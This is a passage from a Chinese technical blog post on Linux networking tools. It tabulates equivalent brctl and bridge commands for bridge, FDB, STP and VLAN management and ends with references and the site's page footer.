<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iproute2</code>  ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute2</code> ；<code>yum install -y iproute2</code></li>
<li>Apline：<code>iproute2 </code> ；<code>apk add iproute2</code></li>
</ul>
</blockquote>
<p>bridge 命令可以完成三种类型的配置管理：</p>
<ul>
<li>端口配置</li>
<li>FDB管理</li>
<li>VLAN 配置</li>
</ul>
<p>大多数人都会使用 <em><strong>brctl</strong></em> 命令替代，而 <em><strong>bridge</strong></em> 通常只是来完成 <em><strong>FDB</strong></em> (forwarding database management ) 的相关操作。。也可以使用 <em><strong>bridge</strong></em> 命令创建和删除VLAN。</p>
<h3 id="bridge-vs-brct-supa-href77asup">bridge vs brct <sup><a href="#7">[7]</a></sup><a hidden class="anchor" aria-hidden="true" href="#bridge-vs-brct-supa-href77asup">¶</a></h3>
<center>BRIDGE MANAGEMENT</center>
<table>
<thead>
<tr>
<th>动作</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>创建bridge</td>
<td><code>brctl addbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
<tr>
<td>删除bridge</td>
<td><code>brctl delbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
<tr>
<td>为bridge添加接口</td>
<td><code>brctl addif &lt;bridge&gt; &lt;ifname&gt;</code></td>
<td></td>
</tr>
<tr>
<td>删除bridge上的接口</td>
<td><code>brctl delbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
</tbody>
</table>
<center>FDB MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>显示 FDB 中的 MAC 列表</td>
<td><code>brctl showmacs &lt;bridge&gt;</code></td>
<td><code>bridge fdb show</code></td>
</tr>
<tr>
<td>设置 FDB 条目老化时间</td>
<td><code>brctl setageingtime  &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置 FDB 垃圾回收间隔</td>
<td><code>brctl setgcint &lt;brname&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>添加FDB 条目(add)</td>
<td></td>
<td><code>bridge fdb add dev &lt;interface&gt; [dst, vni, port, via]</code></td>
</tr>
<tr>
<td>追加FDB条目(append)</td>
<td></td>
<td><code>bridge fdb append  (parameters same as for fdb add)</code></td>
</tr>
<tr>
<td>删除 FDB 条目</td>
<td></td>
<td><code>bridge fdb delete (parameters same as for fdb add)</code></td>
</tr>
</tbody>
</table>
<center>STP MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>打开/关闭 STP</td>
<td><code>brctl stp &lt;bridge&gt; &lt;state&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥优先级</td>
<td><code>brctl setbridgeprio &lt;bridge&gt; &lt;priority&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥转发延迟</td>
<td><code>brctl setfd &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置bridge  “hello”时间</td>
<td><code>brctl sethello &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥最大消息年龄</td>
<td><code>brctl setmaxage &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置桥上端口开销</td>
<td><code>brctl setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt;</code></td>
<td><code>bridge link set dev &lt;port&gt; cost &lt;cost&gt;</code></td>
</tr>
<tr>
<td>设置网桥端口优先级</td>
<td><code>brctl setportprio &lt;bridge&gt; &lt;port&gt; &lt;priority&gt;</code></td>
<td><code>bridge link set dev &lt;port&gt; priority &lt;priority&gt;</code></td>
</tr>
<tr>
<td>是否应端口处理 STP BDPU</td>
<td></td>
<td><code>bridge link set dev &lt;port &gt; guard [on, off]</code></td>
</tr>
<tr>
<td>网桥是否应该在接收到的端口上发送流量</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; hairpin [on,off]</code></td>
</tr>
<tr>
<td>在端口上启用/禁用 fastleave 选项</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; fastleave [on,off]</code></td>
</tr>
<tr>
<td>设置 STP 端口状态</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; state &lt;state&gt;</code></td>
</tr>
</tbody>
</table>
<center>VLAN MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>创建新的 VLAN 过滤器条目</td>
<td></td>
<td>bridge vlan add dev <dev> [vid, pvid, untagged, self, master]</td>
</tr>
<tr>
<td>删除 VLAN 过滤器条目</td>
<td></td>
<td>bridge vlan delete dev <dev> (parameters same as for vlan add)</td>
</tr>
<tr>
<td>列出 VLAN 配置</td>
<td></td>
<td>bridge vlan show</td>
</tr>
</tbody>
</table>
<h2 id="reference">Reference<a hidden class="anchor" aria-hidden="true" href="#reference">¶</a></h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="https://danielmiessler.com/study/tcpdump/" target="_blank"
   rel="noopener nofollow noreferrer" >tcpdump</a></p>
<p><sup id="2">[2]</sup> <a href="https://www.redhat.com/sysadmin/linux-mtr-command" target="_blank"
   rel="noopener nofollow noreferrer" >linux mtr command</a></p>
<p><sup id="3">[3]</sup> <a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank"
   rel="noopener nofollow noreferrer" >man nsenter</a></p>
<p><sup id="4">[4]</sup> <a href="https://laramatic.com/how-to-install-nsenter-in-debian-ubuntu-alpine-arch-kali-CentOS-fedora-raspbian-and-macos/" target="_blank"
   rel="noopener nofollow noreferrer" >How to install nsenter</a></p>
<p><sup id="5">[5]</sup> <a href="https://www.cyberithub.com/10-best-linux-brctl-command-examples-for-ethernet-network-bridge/" target="_blank"
   rel="noopener nofollow noreferrer" >examples for ethernet network bridge</a></p>
<p><sup id="6">[6]</sup> <a href="https://man7.org/linux/man-pages/man8/bridge.8.html" target="_blank"
   rel="noopener nofollow noreferrer" >man bridge</a></p>
<p><sup id="7">[7]</sup> <a href="https://sgros-students.blogspot.com/2013/11/comparison-of-brctl-and-bridge-commands.html" target="_blank"
   rel="noopener nofollow noreferrer" >comparison of brctl and bridge</a></p>
</blockquote>


    
    


<div class="copyrightBlock" >
    <div class="articleSuffix-bg"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 147.78 155.96"> <path d="M10.5,99.81a1.9,1.9,0,0,0-.53-.09,1.66,1.66,0,0,0-1.64,1.65A1.64,1.64,0,0,0,10,103a1.57,1.57,0,0,0,.87-.25l26.76,26.82.45-1.08L11.52,101.91A1.65,1.65,0,0,0,10.5,99.81Zm-.13,2a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.58.58,0,0,1,.57-.57h0a.57.57,0,0,1,.56.58A.55.55,0,0,1,10.37,101.77Z" style="fill:#c5c9e0"></path><path d="M56.15,117.58H39.06l0-.09a1.65,1.65,0,0,0-1.36-1H37.5a1.65,1.65,0,1,0,1.56,2.19H55.7L92.92,156h41.44v-1.08h-41Zm-18.25.94a.56.56,0,0,1-.79,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h0a.58.58,0,0,1,.57.58A.54.54,0,0,1,37.9,118.52Z" style="fill:#c5c9e0"></path><path d="M23.52,50.32a1.65,1.65,0,0,0,1.55-1.11H55.28l48-48.13h31.06V0H102.85l-48,48.13H25.07a1.64,1.64,0,0,0-2.09-1,1.64,1.64,0,0,0,.54,3.2Zm0-2.21a.57.57,0,0,1,0,1.13.57.57,0,1,1,0-1.13Z" style="fill:#c5c9e0"></path><polygon points="102.86 0 102.86 0 102.86 0 102.86 0" style="fill:#c5c9e0"></polygon><path d="M107.72,12.14h26.64V11.07H107.27L57.4,61H3.09a1.66,1.66,0,0,0-1.45-.86H1.52A1.65,1.65,0,1,0,2.81,63a1.59,1.59,0,0,0,.45-.87H57.85ZM2.05,62.23a.57.57,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.56-.57h.09a.57.57,0,0,1,.32,1Z" style="fill:#c5c9e0"></path><path d="M134.36,43.22V42.14h-22.3l-9.62,9.63a1.64,1.64,0,0,0-2.19.77,1.61,1.61,0,0,0-.17.71,1.65,1.65,0,1,0,3.29,0,1.61,1.61,0,0,0-.16-.72l9.3-9.32Zm-32.64,10.6a.57.57,0,0,1,0-1.13.57.57,0,0,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M147,52.3l-9,9H111.48a1.64,1.64,0,0,0-1.61-1.33h-.14a1.65,1.65,0,1,0,1.6,2.41h27.19l9.26-9.29L147,52.3Zm-37.15,9.85a.56.56,0,0,1-.56-.57h0a.56.56,0,0,1,.56-.56h0a.57.57,0,1,1,0,1.13Z" style="fill:#c5c9e0"></path><path d="M66.79,75.35l11,11.06h56.53V85.33H78.27l-11-11.06H49.49L37.12,86.67a1.64,1.64,0,0,0-2.09,1,1.61,1.61,0,0,0-.09.54,1.65,1.65,0,0,0,3.29,0,1.68,1.68,0,0,0-.26-.89l12-12ZM36.58,88.79a.57.57,0,1,1,.57-.56A.57.57,0,0,1,36.58,88.79Z" style="fill:#c5c9e0"></path><path d="M110.61,95.55,92.8,113.4a1.62,1.62,0,1,0,.77.76l17.49-17.53h23.31V95.55ZM92.49,115.28a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,.57-.57h0a.58.58,0,0,1,.56.58A.55.55,0,0,1,92.49,115.28Z" style="fill:#c5c9e0"></path><path d="M97.89,122.3H76.62L64.2,109.85a1.65,1.65,0,0,0-.77-2.2,1.77,1.77,0,0,0-.72-.17h-.14a1.65,1.65,0,0,0,.15,3.29,1.58,1.58,0,0,0,.71-.17l12.74,12.77H98.34l17.48-17.52h18.54v-1.08h-19ZM63.12,109.53a.56.56,0,0,1-.8,0,.58.58,0,0,1-.17-.41.57.57,0,0,1,1.14,0A.54.54,0,0,1,63.12,109.53Z" style="fill:#c5c9e0"></path> </svg> </div>
    <p>本文发布于<a href="https://www.oomkill.com/about" target="_blank">Cylon的收藏册</a>，转载请著名原文链接~</p>
    <p>链接：<a href="https://www.oomkill.com/2021/01/linux-network-command/" target="_blank">https://www.oomkill.com/2021/01/linux-network-command/</a></p>
    <p style="margin-bottom: 0px;">版权：本作品采用<a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">「署名-非商业性使用-相同方式共享 4.0 国际」</a> 许可协议进行许可。</p>
    </div>
</div>
  </div>

  <footer class="post-footer">
    
<nav class="paginav">
  <a class="prev" href="https://www.oomkill.com/2021/01/network-tunnel-technology/">
    <span class="title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left" style="user-select: text;"><line x1="19" y1="12" x2="5" y2="12" style="user-select: text;"></line><polyline points="12 19 5 12 12 5" style="user-select: text;"></polyline>
      </polyline></svg>&nbsp; </span>
    
    <span>网络隧道技术</span>
  </a>
  <a class="next" href="https://www.oomkill.com/2021/01/istio-sidecar-mechnisim/" >
    <span class="title"> </span>
    
    <span>istio sidecar流量处理机制及配置&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right" style="user-select: text;"><line x1="5" y1="12" x2="19" y2="12" style="user-select: text;"></line><polyline points="12 5 19 12 12 19" style="user-select: text;"></polyline></svg></span>
  </a>
</nav>

  </footer>

  
  <div class="pagination__title">
    <span class="pagination__title-h"></span>
  </div>
  
  
  
  
    <div class="comments-separator"></div>
    

<h3 class="relatedContentTitle" >相关阅读</h3>
<ul class="relatedContent">
	
	<li><a href="/2021/01/virtual-networking/"><span>Linux虚拟网络技术</span></a></li>
	
	<li><a href="/2021/01/network-tunnel-technology/"><span>网络隧道技术</span></a></li>
	
	<li><a href="/2021/01/calico-network-cni/"><span>calico network cni网络方案</span></a></li>
	
	<li><a href="/2021/01/ensp-calico-bgp/"><span>使用eNSP构建calico BGP网络</span></a></li>
	
	<li><a href="/2019/11/helm/"><span>Kubernetes包管理 - Helm</span></a></li>
	
</ul>

  

  
    
      <div class="comments-separator"></div>
<div class="comments">
    <script>
    function loadComment() {
        let theme = localStorage.getItem('pref-theme') === 'dark' ? 'dark' : 'light';
        let s = document.createElement('script');
        s.src = 'https://giscus.app/client.js';
        s.setAttribute('data-repo', 'cylonchau\/cylonchau.github.io');
        s.setAttribute('data-repo-id', 'R_kgDOIRlNSQ');
        s.setAttribute('data-category', 'Announcements');
        s.setAttribute('data-category-id', 'DIC_kwDOIRlNSc4CXy1U');
        s.setAttribute('data-mapping', 'title');
        s.setAttribute('data-reactions-enabled', '1');
        s.setAttribute('data-emit-metadata', '1');
        s.setAttribute('data-input-position', 'top');
        s.setAttribute('data-lang', 'zh-TW');
        s.setAttribute('data-theme', theme);
        s.setAttribute('crossorigin', 'anonymous');
        s.setAttribute('async', '');
        document.querySelector('div.comments').innerHTML = '';
        document.querySelector('div.comments').appendChild(s);
    }
    loadComment();
    </script>
</div>
</article>
    </main>
    
<footer class="footer">
  <p>
  Copyright
  <span>&copy; 2024 <a href="https://www.oomkill.com">Cylon&#39;s Collection</a></span></p>
  <span style="display: inline-block; margin-left: 1em;">
    Powered by
    <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> on github-page & Theme
    <a href="https://github.com/reorx/hugo-PaperModX/" rel="noopener" target="_blank">PaperModX</a>
  </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <span class="topInner">
        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z"/>
        </svg>
        <span id="read_progress"></span>
    </span>
</a>

<script>
  (function() {
     
    const disableThemeToggle = '' == '1';
    if (disableThemeToggle) {
      return;
    }

    let button = document.getElementById("theme-toggle")
    
    button.removeEventListener('click', toggleThemeListener)
    
    button.addEventListener('click', toggleThemeListener)
  })();
</script>

<script>
  (function () {
    let menu = document.getElementById('menu')
    if (menu) {
      menu.scrollLeft = localStorage.getItem("menu-scroll-position");
      menu.onscroll = function () {
        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
      }
    }

    const disableSmoothScroll = '' == '1';
    const enableInstantClick = '1' == '1';
    
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches || disableSmoothScroll || enableInstantClick) {
      return;
    }
    
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener("click", function (e) {
        e.preventDefault();
        var id = this.getAttribute("href").substr(1);
        document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
          behavior: "smooth"
        });
        if (id === "top") {
          history.replaceState(null, null, " ");
        } else {
          history.pushState(null, null, `#${id}`);
        }
      });
    });
  })();
</script>

<script>
  document.addEventListener('scroll', function (e) {
      const readProgress = document.getElementById("read_progress");
      const scrollHeight = document.documentElement.scrollHeight;
      const clientHeight = document.documentElement.clientHeight;
      const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
      readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
  })
</script>

<script>
  var menu = document.getElementById('menu')
  if (menu) {
      menu.scrollLeft = localStorage.getItem("menu-scroll-position");
      menu.onscroll = function () {
          localStorage.setItem("menu-scroll-position", menu.scrollLeft);
      }
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener("click", function (e) {
          e.preventDefault();
          var id = this.getAttribute("href").substr(1);
          if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
              document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                  behavior: "smooth"
              });
          } else {
              document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
          }
          if (id === "top") {
              history.replaceState(null, null, " ");
          } else {
              history.pushState(null, null, `#${id}`);
          }
      });
  });
</script>
<script>
  var mybutton = document.getElementById("top-link");
  window.onscroll = function () {
      if (document.body.scrollTop > 200 || document.documentElement.scrollTop > 200) {
          mybutton.style.visibility = "visible";
          mybutton.style.opacity = "1";
      } else {
          mybutton.style.visibility = "hidden";
          mybutton.style.opacity = "0";
      }
  };
</script>
<script>
  if (window.scrollListeners) {
    
    for (const listener of scrollListeners) {
      window.removeEventListener('scroll', listener)
    }
  }
  window.scrollListeners = []
</script>



<script src="/js/medium-zoom.min.js" data-no-instant
></script>
<script>
  document.querySelectorAll('pre > code').forEach((codeblock) => {
    const container = codeblock.parentNode.parentNode;

    const copybutton = document.createElement('button');
    copybutton.classList.add('copy-code');
    copybutton.innerText = 'copy';

    function copyingDone() {
      copybutton.innerText = 'copied';
      setTimeout(() => {
        copybutton.innerText = 'copy';
      }, 2000);
    }

    copybutton.addEventListener('click', (cb) => {
      if ('clipboard' in navigator) {
        navigator.clipboard.writeText(codeblock.textContent);
        copyingDone();
        return;
      }

      const range = document.createRange();
      range.selectNodeContents(codeblock);
      const selection = window.getSelection();
      selection.removeAllRanges();
      selection.addRange(range);
      try {
        document.execCommand('copy');
        copyingDone();
      } catch (e) { };
      selection.removeRange(range);
    });

    if (container.classList.contains("highlight")) {
      container.appendChild(copybutton);
    } else if (container.parentNode.firstChild == container) {
      
    } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
      
      codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
    } else {
      
      codeblock.parentNode.appendChild(copybutton);
    }
  });
</script>




<script>
  
  
  (function() {
    const enableTocScroll = '1' == '1'
    if (!enableTocScroll) {
      return
    }
    if (!document.querySelector('.toc')) {
      console.log('no toc found, ignore toc scroll')
      return
    }
    

    
    const scrollListeners = window.scrollListeners
    const headings = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id]');
    const activeClass = 'active';

    
    let activeHeading = headings[0];
    getLinkByHeading(activeHeading).classList.add(activeClass);

    const onScroll = () => {
      const passedHeadings = [];
      for (const h of headings) {
        
        if (getOffsetTop(h) < 5) {
          passedHeadings.push(h)
        } else {
          break;
        }
      }
      if (passedHeadings.length > 0) {
        newActiveHeading = passedHeadings[passedHeadings.length - 1];
      } else {
        newActiveHeading = headings[0];
      }
      if (activeHeading != newActiveHeading) {
        getLinkByHeading(activeHeading).classList.remove(activeClass);
        activeHeading = newActiveHeading;
        getLinkByHeading(activeHeading).classList.add(activeClass);
      }
    }

    let timer = null;
    const scrollListener = () => {
      if (timer !== null) {
        clearTimeout(timer)
      }
      timer = setTimeout(onScroll, 50)
    }
    window.addEventListener('scroll', scrollListener, false);
    scrollListeners.push(scrollListener)

    function getLinkByHeading(heading) {
      const id = encodeURI(heading.getAttribute('id')).toLowerCase();
      return document.querySelector(`.toc ul li a[href="#${id}"]`);
    }

    function getOffsetTop(heading) {
      if (!heading.getClientRects().length) {
        return 0;
      }
      let rect = heading.getBoundingClientRect();
      return rect.top
    }
  })();
  </script>

<script src="/js/instantclick.min.js" data-no-instant
></script>
<script data-no-instant>
  
  
  
  
  
  
  InstantClick.init();
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/8.6.0/mermaid.min.js" crossorigin="anonymous"></script>
<script>
    mermaid.init(undefined, '.language-mermaid');
</script>
</body>

</html>
